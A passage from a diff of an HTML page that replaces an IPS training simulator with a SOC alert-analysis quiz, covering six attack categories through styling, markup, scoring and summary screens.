@@ -1,935 +1,951 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IPS Simulator - Learn Intrusion Prevention Systems</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NIDS/HIDS Alert Analysis Simulator</title>
+<style>
+  :root{
+    --bg:#f2f5f7;
+    --surface:#ffffff;
+    --surface-2:#eaf0f3;
+    --text:#182430;
+    --text-muted:#51606c;
+    --border:#d6dee3;
+    --accent:#0a6e8a;
+    --accent-strong:#075267;
+    --accent-contrast:#ffffff;
+    --success:#1c8a52;
+    --success-bg:#e6f6ec;
+    --danger:#c0392b;
+    --danger-bg:#fbe9e7;
+    --warning:#9a6b00;
+    --warning-bg:#fff4dd;
+    --info:#2266a8;
+    --info-bg:#e8f1fb;
+    --code-bg:#101821;
+    --code-text:#d9e6ee;
+    --code-accent:#5fd0ff;
+    --focus:#0a6e8a;
+    --shadow: 0 1px 2px rgba(16,24,33,0.06), 0 4px 12px rgba(16,24,33,0.06);
+  }
+  html[data-theme="dark"]{
+    --bg:#0d1420;
+    --surface:#131e2a;
+    --surface-2:#182636;
+    --text:#e7eef4;
+    --text-muted:#9fb0bd;
+    --border:#28394a;
+    --accent:#4fd1e8;
+    --accent-strong:#7fe0f2;
+    --accent-contrast:#06222a;
+    --success:#4ade80;
+    --success-bg:#12301f;
+    --danger:#ff8a80;
+    --danger-bg:#3a1c1a;
+    --warning:#ffcf6b;
+    --warning-bg:#3a2c0d;
+    --info:#7ec4ff;
+    --info-bg:#12283c;
+    --code-bg:#060b10;
+    --code-text:#cfe6f2;
+    --code-accent:#63e0ff;
+    --shadow: 0 1px 2px rgba(0,0,0,0.4), 0 6px 18px rgba(0,0,0,0.35);
+  }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
-            color: #333;
-            line-height: 1.6;
-        }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.5;
+    min-height:100vh;
+    transition:background .25s ease,color .25s ease;
+  }
+  .mono{
+    font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  }
+  a{color:var(--accent);}
 
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+  .app-header{
+    position:sticky;top:0;z-index:20;
+    background:var(--surface);
+    border-bottom:1px solid var(--border);
+    box-shadow:var(--shadow);
+  }
+  .app-header-inner{
+    max-width:960px;margin:0 auto;padding:14px 20px;
+    display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+  }
+  .brand{display:flex;align-items:center;gap:10px;flex:1 1 260px;min-width:0;}
+  .brand-badge{
+    width:38px;height:38px;border-radius:9px;flex:none;
+    background:linear-gradient(135deg,var(--accent),var(--accent-strong));
+    display:flex;align-items:center;justify-content:center;
+    color:var(--accent-contrast);font-size:18px;font-weight:700;
+  }
+  .brand-text h1{font-size:15px;margin:0;font-weight:700;letter-spacing:.2px;}
+  .brand-text p{font-size:12px;margin:0;color:var(--text-muted);}
+  .header-controls{display:flex;align-items:center;gap:10px;flex:none;margin-left:auto;}
+  .score-pill{
+    background:var(--surface-2);border:1px solid var(--border);
+    border-radius:999px;padding:6px 14px;font-size:13px;font-weight:600;
+    white-space:nowrap;
+  }
+  .icon-btn{
+    width:36px;height:36px;border-radius:9px;border:1px solid var(--border);
+    background:var(--surface-2);color:var(--text);cursor:pointer;
+    display:flex;align-items:center;justify-content:center;font-size:16px;
+    transition:transform .15s ease, background .15s ease;
+  }
+  .icon-btn:hover{background:var(--border);}
+  .icon-btn:active{transform:scale(0.94);}
 
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: linear-gradient(135deg, #2e7d32 0%, #4caf50 100%);
-            border-radius: 10px;
-            color: white;
-            box-shadow: 0 4px 15px rgba(46, 125, 50, 0.3);
-        }
+  .progress-track{height:5px;background:var(--surface-2);}
+  .progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent-strong));transition:width .3s ease;}
 
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
+  main{max-width:960px;margin:0 auto;padding:24px 20px 60px;}
+  .screen{display:none;}
+  .screen.active{display:block;animation:fadeIn .25s ease;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:translateY(0);}}
 
-        .header p {
-            font-size: 1.2em;
-            opacity: 0.9;
-        }
+  .card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:24px;
+    box-shadow:var(--shadow);
+    margin-bottom:20px;
+  }
+  h2{font-size:20px;margin:0 0 12px;}
+  h3{font-size:16px;margin:0 0 8px;}
+  p{margin:0 0 12px;color:var(--text);}
+  .muted{color:var(--text-muted);}
+  .small{font-size:13px;}
 
-        .task-counter {
-            background: #1b5e20;
-            padding: 10px 20px;
-            border-radius: 20px;
-            display: inline-block;
-            margin-top: 15px;
-            font-weight: bold;
-        }
+  .badge{
+    display:inline-flex;align-items:center;gap:6px;
+    padding:3px 10px;border-radius:999px;font-size:12px;font-weight:700;
+    text-transform:uppercase;letter-spacing:.4px;
+  }
+  .badge.critical{background:var(--danger-bg);color:var(--danger);}
+  .badge.high{background:var(--warning-bg);color:var(--warning);}
+  .badge.medium{background:var(--info-bg);color:var(--info);}
+  .badge.wired{background:var(--surface-2);color:var(--text-muted);border:1px solid var(--border);}
+  .badge.wireless{background:var(--surface-2);color:var(--text-muted);border:1px solid var(--border);}
 
-        .main-content {
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            gap: 20px;
-        }
+  .obj-list{margin:0 0 14px 0;padding-left:20px;}
+  .obj-list li{margin-bottom:6px;}
 
-        .simulator-panel {
-            background: white;
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #e8f5e8;
-        }
+  .btn{
+    appearance:none;border:none;cursor:pointer;
+    font-family:inherit;font-size:14px;font-weight:600;
+    padding:11px 20px;border-radius:9px;
+    transition:transform .12s ease, box-shadow .12s ease, background .15s ease;
+    display:inline-flex;align-items:center;gap:8px;
+  }
+  .btn:active{transform:translateY(1px);}
+  .btn:focus-visible, .icon-btn:focus-visible, .option:focus-visible{
+    outline:3px solid var(--focus); outline-offset:2px;
+  }
+  .btn-primary{background:var(--accent);color:var(--accent-contrast);}
+  .btn-primary:hover{background:var(--accent-strong);}
+  .btn-primary:disabled{opacity:.5;cursor:not-allowed;}
+  .btn-secondary{background:var(--surface-2);color:var(--text);border:1px solid var(--border);}
+  .btn-secondary:hover{background:var(--border);}
+  .btn-ghost{background:transparent;color:var(--accent);border:1px solid var(--border);}
+  .btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;}
 
-        .info-panel {
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #e8f5e8;
-            height: fit-content;
-        }
+  label.field-label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:var(--text-muted);}
+  input.text-input{
+    width:100%;max-width:340px;padding:10px 12px;border-radius:9px;
+    border:1px solid var(--border);background:var(--surface-2);color:var(--text);
+    font-size:14px;font-family:inherit;
+  }
+  input.text-input:focus-visible{outline:3px solid var(--focus);outline-offset:1px;}
 
-        .network-diagram {
-            background: #f8f9fa;
-            border: 2px dashed #4caf50;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            position: relative;
-            min-height: 200px;
-        }
+  .scenario-meta{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:10px;}
+  .scenario-context{
+    background:var(--surface-2);border:1px solid var(--border);
+    border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:14px;
+  }
 
-        .network-node {
-            position: absolute;
-            width: 80px;
-            height: 60px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
+  pre.logbox{
+    background:var(--code-bg);color:var(--code-text);
+    border-radius:10px;padding:16px;overflow-x:auto;
+    font-size:12.5px;line-height:1.6;margin:0 0 18px;
+    border:1px solid #000;
+  }
+  pre.logbox .l1{color:var(--code-accent);}
+  pre.logbox .cm{color:#8fa6b3;}
 
-        .internet {
-            background: #ff5722;
-            color: white;
-            top: 20px;
-            left: 20px;
-        }
+  .question{font-size:15px;font-weight:600;margin-bottom:12px;}
 
-        .ips {
-            background: #4caf50;
-            color: white;
-            top: 20px;
-            left: 150px;
-            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
-        }
+  .options{display:grid;gap:10px;margin-bottom:6px;}
+  .option{
+    display:flex;align-items:center;gap:12px;
+    text-align:left;width:100%;
+    background:var(--surface-2);border:1px solid var(--border);
+    border-radius:10px;padding:12px 14px;cursor:pointer;color:var(--text);
+    font-family:inherit;font-size:14px;
+  }
+  .option:hover:not(:disabled){border-color:var(--accent);}
+  .option .radio-dot{
+    width:18px;height:18px;border-radius:50%;border:2px solid var(--border);
+    flex:none;position:relative;
+  }
+  .option.selected .radio-dot{border-color:var(--accent);}
+  .option.selected .radio-dot::after{
+    content:"";position:absolute;inset:3px;border-radius:50%;background:var(--accent);
+  }
+  .option.correct{background:var(--success-bg);border-color:var(--success);}
+  .option.correct .radio-dot{border-color:var(--success);}
+  .option.correct .radio-dot::after{background:var(--success);}
+  .option.incorrect{background:var(--danger-bg);border-color:var(--danger);}
+  .option.incorrect .radio-dot{border-color:var(--danger);}
+  .option.incorrect .radio-dot::after{background:var(--danger);}
+  .option:disabled{cursor:not-allowed;}
 
-        .internal-network {
-            background: #2196f3;
-            color: white;
-            top: 20px;
-            right: 20px;
-        }
+  .feedback{
+    border-radius:10px;padding:14px 16px;margin-top:14px;font-size:14px;
+    border:1px solid transparent;display:none;
+  }
+  .feedback.show{display:block;animation:fadeIn .2s ease;}
+  .feedback.correct{background:var(--success-bg);color:var(--success);border-color:var(--success);}
+  .feedback.incorrect{background:var(--danger-bg);color:var(--danger);border-color:var(--danger);}
+  .feedback.reveal{background:var(--warning-bg);color:var(--warning);border-color:var(--warning);}
+  .feedback p{color:inherit;margin:0 0 6px;}
+  .feedback p:last-child{margin-bottom:0;}
+  .feedback strong{color:inherit;}
 
-        .traffic-flow {
-            position: absolute;
-            width: 60px;
-            height: 3px;
-            background: #333;
-            top: 50px;
-        }
+  .hint-box{
+    background:var(--info-bg);color:var(--info);border:1px dashed var(--info);
+    border-radius:10px;padding:12px 14px;margin-top:10px;font-size:13.5px;display:none;
+  }
+  .hint-box.show{display:block;}
+  .hint-box + .hint-box{margin-top:8px;}
 
-        .flow1 { left: 100px; }
-        .flow2 { right: 100px; }
+  table{width:100%;border-collapse:collapse;font-size:13.5px;margin-top:6px;}
+  th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--border);}
+  th{color:var(--text-muted);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.3px;}
+  td.center, th.center{text-align:center;}
+  .tag-ok{color:var(--success);font-weight:700;}
+  .tag-no{color:var(--danger);font-weight:700;}
 
-        .packet {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            position: absolute;
-            top: 120px;
-            animation: movePacket 3s linear infinite;
-        }
+  .grade-hero{
+    display:flex;align-items:center;gap:22px;flex-wrap:wrap;
+    padding:18px 4px 8px;
+  }
+  .grade-circle{
+    width:100px;height:100px;border-radius:50%;flex:none;
+    background:var(--surface-2);border:3px solid var(--accent);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+  }
+  .grade-circle .letter{font-size:34px;font-weight:800;line-height:1;color:var(--accent);}
+  .grade-circle .pct{font-size:12px;color:var(--text-muted);margin-top:2px;}
+  .grade-summary-text{flex:1 1 260px;min-width:0;}
 
-        .legitimate { background: #4caf50; }
-        .malicious { background: #f44336; }
-        .blocked { background: #333; }
+  .review-list{margin:8px 0 0;padding-left:20px;}
+  .review-list li{margin-bottom:6px;font-size:14px;}
 
-        @keyframes movePacket {
-            0% { left: 0; }
-            50% { left: 150px; }
-            100% { left: 300px; }
-        }
+  footer{max-width:960px;margin:0 auto;padding:10px 20px 40px;color:var(--text-muted);font-size:12px;text-align:center;}
 
-        .control-panel {
-            background: #f5f5f5;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-        }
+  .visually-hidden{
+    position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;
+    clip:rect(0,0,0,0);white-space:nowrap;border:0;
+  }
 
-        .control-section {
-            margin-bottom: 20px;
-        }
+  @media (max-width:560px){
+    .grade-hero{flex-direction:column;text-align:center;}
+    .app-header-inner{gap:10px;}
+    .score-pill{font-size:12px;padding:5px 10px;}
+  }
 
-        .control-section h3 {
-            color: #2e7d32;
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
-
-        .button {
-            background: #4caf50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            margin: 5px;
-            transition: all 0.3s ease;
-        }
-
-        .button:hover {
-            background: #45a049;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-
-        .button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .button.danger {
-            background: #f44336;
-        }
-
-        .button.danger:hover {
-            background: #da190b;
-        }
-
-        .select-input {
-            padding: 8px;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-            margin: 5px;
-            background: white;
-        }
-
-        .log-panel {
-            background: #1e1e1e;
-            color: #00ff00;
-            border-radius: 8px;
-            padding: 15px;
-            height: 200px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            margin: 20px 0;
-        }
-
-        .log-entry {
-            margin-bottom: 5px;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-
-        .status-active { background: #4caf50; }
-        .status-warning { background: #ff9800; }
-        .status-blocked { background: #f44336; }
-
-        .signature-list {
-            max-height: 150px;
-            overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 10px;
-            background: white;
-        }
-
-        .signature-item {
-            padding: 5px;
-            margin: 2px 0;
-            background: #f8f9fa;
-            border-radius: 3px;
-            font-size: 12px;
-        }
-
-        .task-description {
-            background: #e3f2fd;
-            border-left: 4px solid #2196f3;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 0 5px 5px 0;
-        }
-
-        .success-message {
-            background: #e8f5e8;
-            border: 2px solid #4caf50;
-            color: #2e7d32;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
-            text-align: center;
-            font-weight: bold;
-        }
-
-        .statistics {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .stat-box {
-            background: #f5f5f5;
-            padding: 15px;
-            border-radius: 5px;
-            text-align: center;
-            border: 2px solid #e0e0e0;
-        }
-
-        .stat-number {
-            font-size: 2em;
-            font-weight: bold;
-            color: #2e7d32;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: #e0e0e0;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #4caf50, #8bc34a);
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-
-        @media (max-width: 768px) {
-            .main-content {
-                grid-template-columns: 1fr;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .statistics {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-    </style>
+  @media print{
+    body{background:#fff;color:#000;}
+    .app-header, .progress-track, .no-print, footer{display:none !important;}
+    main{max-width:100%;padding:0;margin:0;}
+    .card{box-shadow:none;border:1px solid #999;page-break-inside:avoid;}
+    .screen{display:none !important;}
+    .screen#screen-summary{display:block !important;}
+    pre.logbox{background:#f0f0f0;color:#000;border:1px solid #999;}
+    a{color:#000;text-decoration:underline;}
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🛡️ IPS Simulator</h1>
-            <p>Interactive Learning Tool for Intrusion Prevention Systems</p>
-            <div class="task-counter">
-                Task <span id="currentTask">1</span> of 5 - Score: <span id="score">0</span>/100
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressBar"></div>
-            </div>
-        </div>
 
-        <div class="main-content">
-            <div class="simulator-panel">
-                <h2>🌐 Network Simulation</h2>
-                
-                <div class="task-description" id="taskDescription">
-                    <strong>Task 1: System Initialization</strong><br>
-                    Welcome to the IPS Simulator! Your first task is to initialize the IPS system. Click the "Initialize IPS" button to start monitoring network traffic.
-                </div>
-
-                <div class="network-diagram" id="networkDiagram">
-                    <div class="network-node internet">Internet</div>
-                    <div class="network-node ips" id="ipsNode">IPS<br>OFFLINE</div>
-                    <div class="network-node internal-network">Internal<br>Network</div>
-                    <div class="traffic-flow flow1"></div>
-                    <div class="traffic-flow flow2"></div>
-                </div>
-
-                <div class="control-panel">
-                    <div class="control-section">
-                        <h3>🔧 IPS Controls</h3>
-                        <button class="button" id="initializeBtn" onclick="initializeIPS()">Initialize IPS</button>
-                        <button class="button" id="startMonitoringBtn" onclick="startMonitoring()" disabled>Start Monitoring</button>
-                        <button class="button danger" id="shutdownBtn" onclick="shutdownIPS()" disabled>Shutdown IPS</button>
-                    </div>
-
-                    <div class="control-section" id="detectionMethods" style="display: none;">
-                        <h3>🎯 Detection Method</h3>
-                        <select class="select-input" id="detectionMode">
-                            <option value="signature">Signature-Based Detection</option>
-                            <option value="anomaly">Anomaly-Based Detection</option>
-                            <option value="hybrid">Hybrid Detection</option>
-                        </select>
-                        <button class="button" onclick="updateDetectionMethod()">Update Method</button>
-                    </div>
-
-                    <div class="control-section" id="trafficControls" style="display: none;">
-                        <h3>📊 Traffic Simulation</h3>
-                        <button class="button" onclick="sendLegitimateTraffic()">Send Normal Traffic</button>
-                        <button class="button danger" onclick="sendMaliciousTraffic()">Simulate Attack</button>
-                        <button class="button" onclick="sendMixedTraffic()">Mixed Traffic Burst</button>
-                    </div>
-
-                    <div class="control-section" id="signatureControls" style="display: none;">
-                        <h3>📝 Signature Management</h3>
-                        <select class="select-input" id="signatureSelect">
-                            <option value="sql_injection">SQL Injection Pattern</option>
-                            <option value="xss_attack">XSS Attack Pattern</option>
-                            <option value="port_scan">Port Scan Pattern</option>
-                            <option value="dos_attack">DoS Attack Pattern</option>
-                        </select>
-                        <button class="button" onclick="addSignature()">Add Signature</button>
-                        <button class="button danger" onclick="removeSignature()">Remove Signature</button>
-                    </div>
-                </div>
-
-                <div class="log-panel" id="logPanel">
-                    <div class="log-entry">[SYSTEM] IPS Simulator initialized. Ready for training...</div>
-                </div>
-
-                <div class="statistics">
-                    <div class="stat-box">
-                        <div class="stat-number" id="packetsProcessed">0</div>
-                        <div>Packets Processed</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number" id="threatsBlocked">0</div>
-                        <div>Threats Blocked</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number" id="falsePositives">0</div>
-                        <div>False Positives</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="info-panel">
-                <h3>📚 Learning Guide</h3>
-                
-                <div style="margin-bottom: 20px;">
-                    <h4>🎯 Current Objective</h4>
-                    <p id="currentObjective">Initialize the IPS system to begin monitoring network traffic for potential threats.</p>
-                </div>
-
-                <div style="margin-bottom: 20px;">
-                    <h4>🛡️ IPS Status</h4>
-                    <p><span class="status-indicator status-blocked" id="statusIndicator"></span><span id="ipsStatus">Offline</span></p>
-                </div>
-
-                <div style="margin-bottom: 20px;">
-                    <h4>🔍 Detection Methods</h4>
-                    <div style="font-size: 0.9em;">
-                        <p><strong>Signature-Based:</strong> Detects known attack patterns</p>
-                        <p><strong>Anomaly-Based:</strong> Identifies unusual behavior</p>
-                        <p><strong>Hybrid:</strong> Combines both methods</p>
-                    </div>
-                </div>
-
-                <div style="margin-bottom: 20px;">
-                    <h4>📊 Active Signatures</h4>
-                    <div class="signature-list" id="signatureList">
-                        <div class="signature-item">No signatures loaded</div>
-                    </div>
-                </div>
-
-                <div>
-                    <h4>💡 Key Concepts</h4>
-                    <div style="font-size: 0.8em; line-height: 1.4;">
-                        <p>• <strong>IPS:</strong> Actively blocks threats in real-time</p>
-                        <p>• <strong>Inline Deployment:</strong> All traffic passes through IPS</p>
-                        <p>• <strong>Virtual Patching:</strong> Protects against vulnerabilities</p>
-                        <p>• <strong>Network Segmentation:</strong> Monitors traffic flows</p>
-                    </div>
-                </div>
-            </div>
-        </div>
+<header class="app-header">
+  <div class="app-header-inner">
+    <div class="brand">
+      <div class="brand-badge" aria-hidden="true">&#128737;</div>
+      <div class="brand-text">
+        <h1>NIDS/HIDS Alert Analysis Simulator</h1>
+        <p>Identifying &amp; Analyzing Network/Host Intrusion Detection Alerts</p>
+      </div>
     </div>
+    <div class="header-controls">
+      <div class="score-pill no-print" id="progressPill">Briefing</div>
+      <div class="score-pill no-print" id="scorePill">Score: 0</div>
+      <button type="button" class="icon-btn no-print" id="themeToggle" aria-pressed="false" aria-label="Switch to dark mode" title="Toggle light / dark mode">&#9788;</button>
+    </div>
+  </div>
+  <div class="progress-track no-print"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
+</header>
 
-    <script>
-        // Global variables
-        let currentTask = 1;
-        let score = 0;
-        let ipsOnline = false;
-        let monitoringActive = false;
-        let packetsProcessed = 0;
-        let threatsBlocked = 0;
-        let falsePositives = 0;
-        let signatures = [];
-        let detectionMethod = 'signature';
+<main>
 
-        // Task definitions
-        const tasks = [
-            {
-                id: 1,
-                title: "System Initialization",
-                description: "Welcome to the IPS Simulator! Your first task is to initialize the IPS system. Click the 'Initialize IPS' button to start monitoring network traffic.",
-                objective: "Initialize the IPS system to begin monitoring network traffic for potential threats.",
-                points: 20,
-                completed: false
-            },
-            {
-                id: 2,
-                title: "Configure Detection Method",
-                description: "Now that your IPS is online, configure the detection method. Try different approaches: Signature-Based (fast, known threats), Anomaly-Based (detects new threats), or Hybrid (best of both).",
-                objective: "Select and configure a detection method for the IPS system.",
-                points: 20,
-                completed: false
-            },
-            {
-                id: 3,
-                title: "Signature Database Management",
-                description: "Cybersecurity is about staying current with threats. Add threat signatures to your IPS database. Try adding different types of attack signatures and observe how they affect detection.",
-                objective: "Add at least 3 different threat signatures to strengthen your defense capabilities.",
-                points: 20,
-                completed: false
-            },
-            {
-                id: 4,
-                title: "Traffic Analysis & Threat Detection",
-                description: "Time to test your IPS! Start monitoring and simulate different types of network traffic. Send normal traffic, then try malicious attacks. Watch how your IPS responds based on your configuration.",
-                objective: "Successfully detect and block at least 5 malicious attacks while minimizing false positives.",
-                points: 20,
-                completed: false
-            },
-            {
-                id: 5,
-                title: "Advanced Security Operations",
-                description: "Master level! Handle a mixed traffic scenario with multiple simultaneous threats. Analyze the logs, adjust your detection sensitivity, and demonstrate advanced IPS management skills.",
-                objective: "Process mixed traffic scenarios and achieve 90%+ detection accuracy with minimal false positives.",
-                points: 20,
-                completed: false
-            }
-        ];
+  <!-- INTRO / BRIEFING SCREEN -->
+  <section class="screen active" id="screen-intro">
+    <div class="card">
+      <span class="badge medium">Mission Briefing</span>
+      <h2>Welcome to the Security Operations Center</h2>
+      <p>You have been assigned as a <strong>Tier&nbsp;1 SOC Analyst</strong> for a mid-size enterprise network with both
+      wired and wireless segments &mdash; office workstations, a wireless faculty/guest VLAN, internal servers, and a
+      public-facing DMZ web server. Network-based (NIDS) and host-based (HIDS) sensors are streaming alerts to your
+      console.</p>
+      <p>Your job: read each raw alert exactly as an analyst would in a SIEM, decide <strong>what type of attack it
+      represents</strong>, and justify it using the indicators of compromise (IOCs) in the log &mdash; source/destination
+      addresses and ports, protocol flags, payload content, timing, and volume.</p>
 
-        // Initialize the simulator
-        function initializeIPS() {
-            if (ipsOnline) return;
-            
-            ipsOnline = true;
-            addLog('[SYSTEM] Initializing IPS system...', 'info');
-            
-            setTimeout(() => {
-                addLog('[IPS] System initialization complete', 'success');
-                addLog('[IPS] Loading default signature database...', 'info');
-                updateIPSStatus('Online - Ready');
-                document.getElementById('ipsNode').innerHTML = 'IPS<br>ONLINE';
-                document.getElementById('ipsNode').style.backgroundColor = '#4caf50';
-                document.getElementById('statusIndicator').className = 'status-indicator status-active';
-                
-                // Enable buttons
-                document.getElementById('initializeBtn').disabled = true;
-                document.getElementById('startMonitoringBtn').disabled = false;
-                document.getElementById('shutdownBtn').disabled = false;
-                document.getElementById('detectionMethods').style.display = 'block';
-                
-                // Complete task 1
-                completeTask(1);
-                
-            }, 2000);
+      <h3>What you'll practice</h3>
+      <ul class="obj-list">
+        <li>Distinguishing <strong>signature-based</strong> alerts (matches a known attack pattern) from
+        <strong>anomaly-based</strong> alerts (deviates from a normal baseline).</li>
+        <li>Reading NIDS output (Suricata/Snort-style), HIDS logs (auth/syslog-style), and Layer&nbsp;2 anomaly
+        reports (ARP).</li>
+        <li>Identifying six common attack categories from their alert signatures and behavioral indicators.</li>
+        <li>Mapping each finding to real-world frameworks used in industry: <strong>MITRE ATT&amp;CK</strong> and the
+        <strong>CompTIA Security+</strong> exam objectives.</li>
+      </ul>
+
+      <h3>The six attack categories in this exercise</h3>
+      <ul class="obj-list">
+        <li><strong>Reconnaissance / Port Scanning</strong> &mdash; an attacker probing which services are open.</li>
+        <li><strong>Brute-Force / Credential Attack</strong> &mdash; repeated login attempts to guess credentials.</li>
+        <li><strong>Denial-of-Service (DoS/DDoS) Flood</strong> &mdash; overwhelming a system to deny legitimate use.</li>
+        <li><strong>SQL Injection</strong> &mdash; malicious database syntax inserted into an application input.</li>
+        <li><strong>Cross-Site Scripting (XSS)</strong> &mdash; malicious script injected into a web page/response.</li>
+        <li><strong>ARP Spoofing / On-Path (MITM) Attack</strong> &mdash; forged Layer&nbsp;2 addressing to intercept traffic.</li>
+      </ul>
+
+      <p class="small muted">There are 6 alerts total. Each is worth up to 10 points (60 points possible). Using a hint
+      costs 2 points; an incorrect attempt costs 3 points before you can try again. After two incorrect attempts on a
+      single alert, the correct answer is revealed so you can move on and keep learning.</p>
+
+      <label class="field-label" for="studentName">Your name (optional &mdash; appears on your printed/saved summary)</label>
+      <input type="text" class="text-input" id="studentName" placeholder="e.g., Jordan Rivera" maxlength="60">
+
+      <div class="btn-row">
+        <button type="button" class="btn btn-primary" id="startBtn">Begin Simulation &rarr;</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCENARIO SCREEN (template populated by JS) -->
+  <section class="screen" id="screen-scenario">
+    <div class="card">
+      <div class="scenario-meta">
+        <span class="badge" id="scSeverity">Severity</span>
+        <span class="badge" id="scLocation">Segment</span>
+        <span class="small muted" id="scSensor"></span>
+      </div>
+      <h2 id="scTitle">Alert Title</h2>
+      <div class="scenario-context" id="scContext"></div>
+      <pre class="logbox mono" id="scLog"></pre>
+
+      <p class="question">Based on the indicators above, which attack category best matches this alert?</p>
+      <div class="options" id="scOptions" role="radiogroup" aria-label="Attack category options"></div>
+
+      <div class="feedback" id="scFeedback" role="status" aria-live="polite"></div>
+      <div id="scHints"></div>
+
+      <div class="btn-row">
+        <button type="button" class="btn btn-secondary" id="hintBtn">Get a Hint</button>
+        <button type="button" class="btn btn-primary" id="submitBtn" disabled>Submit Answer</button>
+        <button type="button" class="btn btn-primary" id="nextBtn" style="display:none;">Next Alert &rarr;</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SUMMARY SCREEN -->
+  <section class="screen" id="screen-summary">
+    <div class="card">
+      <span class="badge medium">Shift Debrief</span>
+      <h2>Simulation Summary</h2>
+      <p class="muted small" id="summaryMeta"></p>
+
+      <div class="grade-hero">
+        <div class="grade-circle">
+          <span class="letter" id="gradeLetter">-</span>
+          <span class="pct" id="gradePct">0%</span>
+        </div>
+        <div class="grade-summary-text">
+          <p id="gradeHeadline"><strong>Score summary</strong></p>
+          <p class="small muted" id="gradeSub"></p>
+        </div>
+      </div>
+
+      <h3>Alert-by-Alert Results</h3>
+      <div style="overflow-x:auto;">
+      <table id="resultsTable">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Attack Category</th>
+            <th class="center">Result</th>
+            <th class="center">Attempts</th>
+            <th class="center">Hints Used</th>
+            <th class="center">Points</th>
+          </tr>
+        </thead>
+        <tbody id="resultsBody"></tbody>
+      </table>
+      </div>
+
+      <h3 style="margin-top:20px;">Instructor Feedback</h3>
+      <p class="small" id="strengthsIntro"></p>
+      <ul class="review-list" id="strengthsList"></ul>
+      <p class="small" id="reviewIntro"></p>
+      <ul class="review-list" id="reviewList"></ul>
+
+      <div class="btn-row no-print">
+        <button type="button" class="btn btn-primary" id="printBtn">&#128424; Print Summary</button>
+        <button type="button" class="btn btn-primary" id="saveBtn">&#11015; Save Summary (.txt)</button>
+        <button type="button" class="btn btn-secondary" id="restartBtn">&#8635; Restart Simulation</button>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="no-print">
